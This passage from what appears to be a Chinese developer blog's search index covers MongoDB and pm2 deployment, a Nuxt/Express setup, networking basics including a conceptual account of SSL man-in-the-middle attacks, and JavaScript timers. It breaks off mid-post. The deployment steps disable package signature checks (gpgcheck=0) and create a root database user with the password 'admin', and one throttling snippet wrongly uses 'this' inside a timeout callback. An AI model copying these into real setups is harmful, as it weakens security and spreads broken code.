baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.4/x86_64/  gpgcheck=0  enabled=1  #安装mongodb  yum install -y mongodb-org   #启动mongodb  systemctl start mongod.service   #停止mongodb  systemctl stop mongod.service  #设置mongodb开机启动  systemctl enable mongod.service  #修改mongodb配置文件  vi /etc/mongod.conf  #修改以下内容：  security:    authorization: enabled  #添加数据库用户及密码  mongo       use admin  db.createUser({   user: &quot;admin&quot;,   pwd: &quot;admin&quot;,   roles: [ { role: &quot;root&quot;, db: &quot;admin&quot; } ]   })  </code></pre><h4 id="程序部署"><a href="#程序部署" class="headerlink" title="程序部署"></a>程序部署</h4><h5 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h5><p>git clone <a href="https://github.com/SoftwareSAD/StaticPageServer.git" target="_blank" rel="noopener">https://github.com/SoftwareSAD/StaticPageServer.git</a>  </p><h5 id="参数配置"><a href="#参数配置" class="headerlink" title="参数配置"></a>参数配置</h5><ul><li><p>服务器参数配置<br>nuxt.config.js设置（将host改为0.0.0.0；将port改为80）</p><pre><code>env: {baseUrl: process.env.BASE_URL || &#39;http://localhost:3000&#39;,HOST: &#39;127.0.0.1&#39;,//0.0.0.0PORT: &#39;3000&#39;,//80},</code></pre></li><li><p>server/server.js设置（将host改为0.0.0.0；将port改为80）</p><pre><code>const host = process.env.HOST || &#39;127.0.0.1&#39;const port = process.env.PORT || 3000</code></pre></li></ul><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ol><li>打开StaticPageServer根目录  </li><li>npm install</li><li>pm2 start npm –name “sad-project” – run pm2build  </li></ol><h5 id="运行和停止"><a href="#运行和停止" class="headerlink" title="运行和停止"></a>运行和停止</h5><pre><code>#查看进程：  pm2 list  #或者(0为进程id)  pm2 show 0  #开启  pm2 start 0   #停止  pm2 stop 0  #重载  pm2 reload 0  #删除/卸载  pm2 delete 0  #显示后台日志  pm2 logs 0  </code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nuxt+express+MongoDB+NodeJS框架搭建</title>
      <link href="/2018/05/22/nuxt-express-mongodb-nodejs-kuang-jia-da-jian/"/>
      <url>/2018/05/22/nuxt-express-mongodb-nodejs-kuang-jia-da-jian/</url>
      
        <content type="html"><![CDATA[<h4 id="参考项目及博客"><a href="#参考项目及博客" class="headerlink" title="参考项目及博客"></a>参考项目及博客</h4><ol><li><a href="https://github.com/nuxt-community/create-nuxt-app" target="_blank" rel="noopener">初始框架搭建</a></li><li><a href="https://github.com/veaba/express-nuxt" target="_blank" rel="noopener">后台具体逻辑搭建</a></li><li><a href="https://www.jianshu.com/p/871c604d9aa2" target="_blank" rel="noopener">数据与后台交互，axios的使用</a></li><li><a href="https://zh.nuxtjs.org/" target="_blank" rel="noopener">Nuxt学习教程</a></li><li><a href="https://bootstrap-vue.js.org/" target="_blank" rel="noopener">bootstrap-vue前端框架</a></li><li><a href="https://stackoverflow.com/questions/42185035/webpack-uncaught-syntaxerror-unexpected-token-import" target="_blank" rel="noopener">解决Unexpected token import 问题</a></li></ol><h4 id="具体目录"><a href="#具体目录" class="headerlink" title="具体目录"></a>具体目录</h4><ul><li>最终项目生成框架<br><img src="/img/in-post/nuxt-00.JPG" alt="最终项目生成框架"><ul><li>asserts下放img和css资源</li><li>components下放自定义组件</li><li>layouts下放自定义的页面的布局</li><li>pages下放自定义的各个页面</li><li>server是后端控制部分<br>项目默认调用文件是index.js和index.vue</li></ul></li></ul><h4 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h4><p>eg.</p><pre><code>npm install @nuxtjs/axios --savenpm install bootstrap-vue --savenpm install body-parser --savenpm install backpack-core --savenpm install babel-core babel-eslint babel-polyfill babel-preset-es2015 --save-dev</code></pre><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><ol><li>将package.json中的script修改为:<pre class=" language-bash"><code class="language-bash"><span class="token string">"scripts"</span><span class="token keyword">:</span> <span class="token punctuation">{</span> <span class="token string">"dev"</span><span class="token keyword">:</span> <span class="token string">"backpack dev"</span>, <span class="token string">"build"</span><span class="token keyword">:</span> <span class="token string">"nuxt build &amp;&amp; backpack build &amp;&amp; npm start"</span>, <span class="token string">"start"</span><span class="token keyword">:</span> <span class="token string">"cross-env NODE_ENV=production node build/main.js"</span>, <span class="token string">"generate"</span><span class="token keyword">:</span> <span class="token string">"nuxt generate"</span>, <span class="token string">"lint"</span><span class="token keyword">:</span> <span class="token string">"eslint --ext .js,.vue --ignore-path .gitignore ."</span>, <span class="token string">"precommit"</span><span class="token keyword">:</span> <span class="token string">"npm run lint"</span>, <span class="token string">"pm2build"</span><span class="token keyword">:</span> <span class="token string">"nuxt build &amp;&amp; backpack build &amp;&amp; npm start"</span>, <span class="token string">"heroku-postbuild"</span><span class="token keyword">:</span> <span class="token string">"nuxt build &amp;&amp; backpack build"</span><span class="token punctuation">}</span>,</code></pre></li><li>将运行入口文件定义为（这里主要解决node不能完全支持es6\7语法的问题）：<pre class=" language-bash"><code class="language-bash">require<span class="token punctuation">(</span><span class="token string">'babel-core/register'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>require<span class="token punctuation">(</span><span class="token string">'babel-polyfill'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>require<span class="token punctuation">(</span><span class="token string">'./server'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>backpack.config.js为(这里主要将文件js重新打包，用于生产环境线上发布)：<pre class=" language-bash"><code class="language-bash">module.exports <span class="token operator">=</span> <span class="token punctuation">{</span>webpack: <span class="token punctuation">(</span>config, options, webpack<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> config.entry.main <span class="token operator">=</span> <span class="token string">'./server/index.js'</span> config.resolve.modules <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'./server'</span><span class="token punctuation">]</span> <span class="token keyword">return</span> config<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>同时添加babel环境文件.babelrc，为：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"presets"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token string">"es2015"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>运行时</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">npm</span> run dev //开发环境$ <span class="token function">npm</span> run build //生产环境，将js，css重新压缩$ <span class="token function">npm</span> run start //需要先运行npm run build在运行</code></pre></li></ol><h4 id="前后端交互"><a href="#前后端交互" class="headerlink" title="前后端交互"></a>前后端交互</h4><ol><li><p>例如在pages/all-news页面中，我们要在页面加载是获取后台数据，我们可以：</p><pre class=" language-bash"><code class="language-bash"> async created<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   await this.initNewsData<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>, methods: <span class="token punctuation">{</span>   async initNewsData<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     try <span class="token punctuation">{</span>       <span class="token keyword">let</span> <span class="token punctuation">{</span>data<span class="token punctuation">}</span> <span class="token operator">=</span> await axios.get<span class="token punctuation">(</span><span class="token string">'/api/getAllNews'</span>, <span class="token punctuation">{</span>params: <span class="token punctuation">{</span>currentPage: 1<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>       this.allnewsdata<span class="token operator">=</span>data.data     <span class="token punctuation">}</span> catch <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>       console.log<span class="token punctuation">(</span>e<span class="token punctuation">)</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span>,</code></pre></li><li>在server/api/index.vue 和 server/server.js中，我们定义了路由逻辑</li></ol><ul><li>server.js<pre class=" language-bash"><code class="language-bash">app.use<span class="token punctuation">(</span><span class="token string">'/api'</span>, api<span class="token punctuation">)</span></code></pre></li><li>api/index.js:<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> express from <span class="token string">'express'</span><span class="token function">import</span> mongoose from <span class="token string">'mongoose'</span><span class="token function">import</span>  smsverity from <span class="token string">'./smsverity'</span><span class="token function">import</span> movie from <span class="token string">'./movie'</span><span class="token function">import</span> cinema from <span class="token string">'./cinema'</span><span class="token function">import</span> <span class="token function">users</span> from <span class="token string">'./users'</span><span class="token function">import</span> news from <span class="token string">'./news'</span><span class="token function">import</span> <span class="token punctuation">{</span>config<span class="token punctuation">}</span> from <span class="token string">'../config'</span>/**用户注册登录选择*/router.use<span class="token punctuation">(</span>users<span class="token punctuation">)</span></code></pre></li><li>数据库连接:<pre class=" language-bash"><code class="language-bash">mongoose.Promise <span class="token operator">=</span> global.Promisemongoose.connect<span class="token punctuation">(</span>config.url<span class="token punctuation">)</span><span class="token punctuation">;</span>var db <span class="token operator">=</span> mongoose.connection<span class="token punctuation">;</span>db.on<span class="token punctuation">(</span><span class="token string">'error'</span>, console.error.bind<span class="token punctuation">(</span>console, <span class="token string">'数据库连接失败:'</span><span class="token punctuation">))</span><span class="token punctuation">;</span>db.once<span class="token punctuation">(</span><span class="token string">'open'</span>, function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>console.log<span class="token punctuation">(</span><span class="token string">'数据库已连接'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><ol start="3"><li><p>在server/config.js中，我们定义mongodb数据库信息:</p><pre class=" language-bash"><code class="language-bash">module.exports.config <span class="token operator">=</span> <span class="token punctuation">{</span>url: <span class="token string">'mongodb://username:password@host:port/database'</span>,domain: <span class="token string">'mlab.com'</span>, // 主域名scheme: <span class="token string">'mongodb'</span>, // 协议database: <span class="token string">'database'</span>, // 数据库名称username: <span class="token string">'username'</span>, // 管理员用户名称password: <span class="token string">'password'</span>// 管理员密码<span class="token punctuation">}</span></code></pre></li><li><p>在api/news.js中，我们定义了数据库操作行为:</p><pre class=" language-bash"><code class="language-bash"> router.get<span class="token punctuation">(</span><span class="token string">'/getAllNews'</span>, async <span class="token punctuation">(</span>req, res, next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>     <span class="token keyword">let</span> page <span class="token operator">=</span> req.query.currentPage       console.log<span class="token punctuation">(</span><span class="token string">'########拉取第'</span> + page + <span class="token string">'页资讯#########'</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span> <span class="token punctuation">{</span>         _dbError<span class="token punctuation">(</span>res<span class="token punctuation">)</span>       console.log<span class="token punctuation">(</span><span class="token string">'errror'</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> <span class="token boolean">false</span>     <span class="token punctuation">}</span>     <span class="token keyword">let</span> page_length <span class="token operator">=</span> 10   // 每10项为一页     <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token punctuation">(</span>page - 1<span class="token punctuation">)</span> * page_length     <span class="token keyword">let</span> newsArr <span class="token operator">=</span> await NewsModel.find<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>.limit<span class="token punctuation">(</span>page_length<span class="token punctuation">)</span>.skip<span class="token punctuation">(</span>count<span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">let</span> findNews <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>let item of newsArr<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">let</span> ob <span class="token operator">=</span> JSON.parse<span class="token punctuation">(</span>JSON.stringify<span class="token punctuation">(</span>item<span class="token punctuation">))</span>         findNews.push<span class="token punctuation">(</span>ob<span class="token punctuation">)</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> _dbSuccess<span class="token punctuation">(</span>res, <span class="token string">'获取新闻成功'</span>, findNews<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>在server/model中我们定义了数据库模型/表:</p><pre class=" language-bash"><code class="language-bash">const newsSchema <span class="token operator">=</span> new Schema<span class="token punctuation">(</span><span class="token punctuation">{</span>id: String,title: String,  //新闻标题abstract: String,//新闻摘要article: String, //新闻内容cover_img_src: <span class="token punctuation">{</span>type: String, default: <span class="token string">"../../assets/img/7.jpg"</span><span class="token punctuation">}</span>, //新闻封面图content_img_src: Array, //内容图片url: String, //新闻链接date: String, //新闻发布时间view_count: String, //新闻浏览人数<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础知识</title>
      <link href="/2017/10/11/ji-suan-ji-ji-chu-zhi-shi/"/>
      <url>/2017/10/11/ji-suan-ji-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><img src="https://blog.csdn.net/baidu_37964071/article/details/80500825" alt="DNS（域名解析协议）详解"></p><h4 id="计算机网络中的七层模型"><a href="#计算机网络中的七层模型" class="headerlink" title="计算机网络中的七层模型"></a>计算机网络中的七层模型</h4><ul><li>七层模型也称为OSI(Open System Interconnection)参考模型，是国际标准化组织指定的一个用于计算机或通讯系统间互联的标准体系</li><li>建立七层模型的主要目的是为解决异种网络互连时遇到的兼容性问题，它最大的优点是将服务、接口和协议这三个概念明确区分开：服务说明某一层为上一层提供什么功能呢；接口说明上一层如何使用下层服务；协议涉及如何实现本层的服务；</li><li><strong>应用层</strong>：访问网络服务的接口（为操作系统或网络应用程序提供网络服务的接口；常见：Telnet、FTP、HTTP、DNS等）</li><li><strong>表示层</strong>：提供数据格式转换服务（例如加密与解密、图片解码和编码、数据的压缩和解压缩）</li><li><strong>会话层</strong>：建立端连接并提供访问验证和会话管理（使用校验点可使会话在通信失效时从校验点恢复通信，常见：服务器验证用户登录、断点续传）</li><li><strong>传输层</strong>：建立应用进程之间的逻辑通信（建立连接、处理数据包错误、数据包次序；常见：TCP、UDP、进程、端口socket）</li><li><strong>网络层</strong>：为数据在结点之间传输创建逻辑链路，并分组转发数据（例如对子网间的数据吧进行路由选择；常见路由器、多层交换机、防火墙、IP）</li><li><strong>链路层</strong>：为通信的实体间建立数据链路连接（例如将数据分帧、并处理流控制、物理地址寻址、重发等；常见网卡、网桥、二层交换机）</li><li><strong>物理层</strong>：为数据端设备提供原始比特流的传输的通路（例如网络通信的数据传输截止，有电缆和设备共同构成）</li></ul><h4 id="TCP和UDP"><a href="#TCP和UDP" class="headerlink" title="TCP和UDP"></a>TCP和UDP</h4><ul><li>TCP和UDP都是传输层协议</li><li>TCP三次握手：<ul><li>客户端发送一个带SYN(seq=j)同步序列标志的报文到服务端，等待服务器确认</li><li>服务器接收到SYN包，确认后发送一个带ACK(ack=j+1)确认标志位和SYN同步序列(seq=k)标志位的报文到客户端</li><li>客户端确认后，发回一个带ACK(ack=k+1)确认位标志的报文到服务器，连接建立</li></ul></li><li>TCP四次挥手：<ul><li>客户端发送一个带FIN(seq=m)终止标志位的报文到服务器</li><li>服务器确认后，返回一个带ACK(ack=m+1)确认标志位的报文到客户端</li><li>服务器发送一个带FIN(seq=n)标志位的报文到客户端</li><li>客户端发回ACK(ack=n+1)报文确认，关闭连接</li></ul></li><li>TCP是面向连接的协议；UDP是面向非连接的协议，即发送数据前不需要建立连接</li><li>TCP提供可靠服务，即通过TCP连接的数据无差错、不丢失、不重复且按序到达；UDP尽最大努力交付，即不保证可靠交付</li><li>UDP具有较好的实时性，工作效率比TCP高，适用于高速传输和实时性较高的通信或者广播通信</li><li>每条TCP连接只能是点到点；UDP支持一对一、一对多、多对一和多对多的交互通信</li><li>TCP可靠性依靠机制：<ul><li>检验和：数据端反码相加，全为1则正确</li><li>序列号：TCP为每个字节的数据都进行了编码，保证可靠性、保证数据的按序到达；提高效率、可实现多次发送一次确认、去除重复数据</li><li>确认应答机制：ACK确认位</li><li>超时重传机制：当报文在发出一定时间内未收到接收方的确认，发送方就会重传</li><li>连接管理机制：三次握手、四次挥手</li><li>流量控制：接收端处理数据的速度是有限的，如果发送方数据的速度过快，导致接收端缓冲区满，而发送方继续发送，就会导致丢包，继而引起丢包重传等后续反应；因此在应答报文中，将接收方自身缓冲区大小返回，并定时发送一个窗口探测数据段</li><li>拥塞控制机制：<ul><li>慢启动：启动初期以指数增长方式增长，即由小到大逐渐增加拥塞窗口的大小</li><li>拥塞避免：防止拥塞窗口过大引起网络拥塞，设置一个慢启动的阈值，当拥塞窗口大于阈值使用拥塞避免算法，按照线性增长方式增加</li><li>快重传：发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期</li><li>快恢复</li></ul></li></ul></li><li><strong>Socket</strong>是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议</li></ul><h4 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h4><ul><li><strong>进程</strong> 是资源（CPU、内存）分配的基本单位，它是程序执行时的一个实例；程序运行的时候操作系统会创建一个进程，并且为它分配资源，然后把该进程放进进程就绪队列，进程调度器选中它的时候，就会为它分配CPU时间，程序开始真正运行</li><li>进程和线程<ul><li>进程是资源分配的最小单位，线程是程序执行的最小单位</li><li>进程有独立的地址空间，每启动一个进程，系统就会为它分配地址空间，建立数据表维护代码段、堆栈段和数据段，这种操作是昂贵的；创建和撤销进程的系统开销远大于创建和撤销线程的系统开销</li><li>多进程更加健壮，多线程只要有一个线程死掉，整个进程也死掉</li><li>线程之间的通信更方便，同一进程下的线程共享全局变量、静态变量等数据，而进程之间的通信需要以通信的方式（IPC)进行。不过如何处理好同步与互斥是编写多线程程序的难点<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4></li></ul></li><li>ARP协议是将IP地址转换为MAC地址，DNS协议是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）；IP地址是面向主机的，而域名是面向用户的</li><li>域名服务器按层次分类：本地域名服务器、权限域名服务器、顶级域名服务器、根域名服务器</li><li>域名解析过程：<ul><li>查找自己主机对应的域名服务器，域名服务器先查找自己数据库中的数据</li><li>如果没有，就向上级查找一次类推</li><li>最多回溯到根域名服务器</li><li>域名服务器本身也会进行一些缓存，把曾经访问过的域名和对应的IP地址缓存，可以加速查找</li></ul></li><li>从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询</li><li>解析顺序：浏览器缓存-系统缓存（hosts文件）-路由器缓存-本地服务器缓存-根域名服务器-顶级域名服务器-主域名服务器-保存结果至缓存</li></ul><h4 id="从输入url到获取页面的过程"><a href="#从输入url到获取页面的过程" class="headerlink" title="从输入url到获取页面的过程"></a>从输入url到获取页面的过程</h4><ul><li>DNS解析IP地址</li><li>客户端与目标服务器建立TCP连接</li><li>客户端发送HTTP请求</li><li>服务器处理请求并返回HTTP请求报文</li><li>浏览器渲染页面<ul><li>浏览器解析HTML文件构建DOM树</li><li>浏览器遇到脚本标签，如果不是defer或者async会阻塞DOM树构建，同时加载并执行脚本</li><li>浏览器解析CSS文件构建CSSOM树</li><li>浏览器结合DOM树和CSSOM树构建渲染树</li><li>计算样式并渲染到页面</li></ul></li></ul><h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><ul><li>HTTPS是在HTTP的基础上加入了SSL协议，依靠证书来验证服务器的身份，并且为浏览器和服务器之间的通信加密</li><li>HTTP是超文本传输协议，是明文传输；HTTPS使用具有安全性的SSL加密输出协议</li><li>浏览器使用HTTP时，直接同TCP通信；浏览器使用HTTPS时，浏览器会同TLS/SSL通信，再和TCP通信</li><li>SSL协议的握手过程：<ul><li>客户端向服务器传输客户端的SSL协议版本号、支持的加密算法种类、产生的随机数random1及其他信息</li><li>服务器在客户端发送过来的加密算法列表中选取一种，产生随机数random2发送给客户端，同时将包含公钥的数字证书发给客户端</li><li>客户端验证服务器的合法性（证书是否过期、发行服务器证书的CA是否可靠、发行者的公钥能否正确解开数字前面、服务器证书上的域名是否和服务器的实际域名相匹配），如果合法则客户端产生一个随机数并用证书中的公钥进行加密，发送给服务器</li><li>服务器收到客户端的恢复，利用自己的私钥解密，获得前面产生的三个随机数，通过协商的加密方式生成一个对称密钥；</li><li>握手阶段完成，之后的会话通过这个对称密钥进行加密传输</li></ul></li><li>https协议握手阶段比较费时，会使页面加载时间延长；https连接缓存不如http高效，会增加数据开销和功耗；ssl证书一般不是免费的；</li><li><strong>中间人攻击原理</strong><ul><li>针对SSL的中间人攻击方式主要有两类：SSL劫持攻击和SSL剥离攻击</li><li>原理：中间人截取客户端发送给服务器的请求，然后伪装成客户端与服务器进行通信;将服务器返回给客户端的内容发送给客户端，伪装成服务器与客户端进行通信</li><li>SSL劫持攻击：攻击者为了获得HTTPS传输的明文数据，需要先将自己接入到客户端和目标网站之间；在传输过程中伪造服务器的证书，将服务器的公钥替换成自己的公钥</li><li>SSL剥离攻击：将攻击者设置为中间人，之后见HTTPS范文替换为HTTP返回给浏览器，而中间人和服务器之间仍然保持HTTPS服务器。由于HTTP是明文传输的，所以中间人可以获取客户端和服务器传输数据</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS计时器详解</title>
      <link href="/2017/09/18/js-ji-shi-qi-xiang-jie/"/>
      <url>/2017/09/18/js-ji-shi-qi-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="定时器基础"><a href="#定时器基础" class="headerlink" title="定时器基础"></a>定时器基础</h4><ul><li>JavaScript是运行于单线程环境中的，而定时器仅仅只是计划代码在未来的某个时间执行。执行的时机是不能保证的，因为在页面的生命周期中，不同时间可能有其他代码在控制JavaScript进程</li><li>定时器对队列的工作方式是，当特定的时间过去后将代码插入事件队列，并不保证立刻执行</li><li>重复的定时器的规则有两个问题：① 某些间隔会被跳过； ② 多个定时器的代码执行之间的间隔可能会比预期的小；为避免setInterval的缺点，可以使用链是setTimeout()调用：<pre class=" language-javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 处理</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">,</span> interval<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> interval<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>每次函数执行的时候都会创建一个新的定时器。第二个setTimeout调用使用了 arguments.callee 来获取对当前执行的函数的引用，并为其设置另一个定时器。这样做的好处是，在一个定时器代码执行完前，不会向队列插入新的定时器代码</li></ul></li></ul><h4 id="Yielding-Processes"><a href="#Yielding-Processes" class="headerlink" title="Yielding Processes"></a>Yielding Processes</h4><ul><li>JavaScript的执行是一个阻塞操作，脚本运行所化时间越久，用户无法与页面交互的时间也越久，在展开循环前，思考两个问题：<ul><li>该处理是否必须同步完成？如果该数据的处理会造成其他运行的阻塞，那么最好不要改动</li><li>数据是否需要按顺序完成？如果顺序不是必须的，那么可以将一些处理推迟</li></ul></li><li>数组分块函数：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">chunk</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> process<span class="token punctuation">,</span> context<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> item <span class="token operator">=</span> array<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    process<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> printValue<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>一旦某个函数需要花50ms以上的时间完成，那么最好看看能否将任务分割为一个系列可以实验定时器的小任务</li></ul><h4 id="函数节流"><a href="#函数节流" class="headerlink" title="函数节流"></a>函数节流</h4><ul><li>浏览器中的某些计算和处理要比其他的昂贵很多，例如：DOM操作比起非DOM交互需要更多的内存和CPU时间。连续尝试进行过多的DOM相关操作可能会导致浏览器挂起</li><li>思想：某些代码不可以在没有时间间隔的情况下连续重复执行。第一次调用函数，创建一个定时器，在指定的时间间隔之后运行代码。当第二次调用该函数时，它会清除前一次的定时器并设置另一个。也就是说，如果前一个定时器的任务尚未执行，会将其替换成一个新的定时器。目的是只有执行函数的请求停止一段时间之后才会执行;代码是周期性执行的</li><li>模式：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> processor <span class="token operator">=</span> <span class="token punctuation">{</span>  timeoutId<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>  performProcessing<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//实际执行的代码</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  process<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">clearTimeout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>timeoutId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>timeoutId <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">performProcessing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>processor<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>节流函数<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> throttle <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>method<span class="token punctuation">,</span> delay<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> context <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> args <span class="token operator">=</span> arguments<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>timer<span class="token punctuation">)</span> <span class="token punctuation">{</span>      timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        method<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="函数防抖"><a href="#函数防抖" class="headerlink" title="函数防抖"></a>函数防抖</h4><ul><li>当持续触发事件时，一定时间段内没有再触发事件，事件处理函数才会执行一次，如果设定的时间到来之前，又一次触发了事件，就重新开始延时<pre class=" language-javascript"><code 